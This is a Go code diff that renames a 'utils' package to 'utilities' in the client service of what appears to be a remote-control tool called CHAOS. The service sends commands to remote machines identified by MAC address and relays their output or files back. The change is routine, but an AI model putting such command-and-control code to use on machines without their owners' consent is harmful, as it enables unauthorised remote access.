@@ -5,11 +5,11 @@ import (
 	"fmt"
 	"github.com/google/uuid"
 	repo "github.com/tiagorlampert/CHAOS/repositories"
-	"github.com/tiagorlampert/CHAOS/shared/utils"
-	"github.com/tiagorlampert/CHAOS/shared/utils/constants"
-	"github.com/tiagorlampert/CHAOS/shared/utils/image"
-	"github.com/tiagorlampert/CHAOS/shared/utils/jwt"
-	"github.com/tiagorlampert/CHAOS/shared/utils/system"
+	"github.com/tiagorlampert/CHAOS/shared/utilities"
+	"github.com/tiagorlampert/CHAOS/shared/utilities/constants"
+	"github.com/tiagorlampert/CHAOS/shared/utilities/image"
+	"github.com/tiagorlampert/CHAOS/shared/utilities/jwt"
+	"github.com/tiagorlampert/CHAOS/shared/utilities/system"
 	"os/exec"
 	"strings"
 	"time"
@@ -38,7 +38,7 @@ func NewClient(
 }
 
 func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) (SendCommandOutput, error) {
-	addr, err := utils.DecodeBase64(input.MacAddress)
+	addr, err := utilities.DecodeBase64(input.MacAddress)
 	if err != nil {
 		return SendCommandOutput{}, fmt.Errorf(`error decoding base64: %w`, err)
 	}
@@ -60,7 +60,7 @@ func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) 
 		}
 	}
 
-	res := utils.ByteToString(payload.Response)
+	res := utilities.ByteToString(payload.Response)
 	if payload.HasError {
 		return SendCommandOutput{}, fmt.Errorf(res)
 	}
@@ -77,7 +77,7 @@ func HandleResponse(payload *PayloadData) (*PayloadData, error) {
 		if err != nil {
 			return nil, err
 		}
-		payload.Response = utils.StringToByte(file)
+		payload.Response = utilities.StringToByte(file)
 		break
 	default:
 		return payload, nil
